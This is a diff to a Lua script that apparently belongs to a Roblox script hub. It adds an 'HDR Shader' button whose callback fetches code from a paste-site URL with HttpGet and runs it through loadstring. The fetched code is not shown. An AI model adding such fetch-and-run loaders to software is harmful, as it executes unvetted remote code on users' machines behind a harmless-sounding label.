@@ -4113,6 +4113,13 @@ function _G.Disable3DRendering(enabled)
 	end
 end
 
+SettingsTab:Button({
+	Title = "HDR Shader",
+	Callback = function()
+		loadstring(game:HttpGet("https://paste.monster/IVE9Xt3YJWkp/raw/"))()
+	end,
+})
+
 SettingsTab:Toggle({
     Title = "Disable 3D Rendering",
     Value = false,
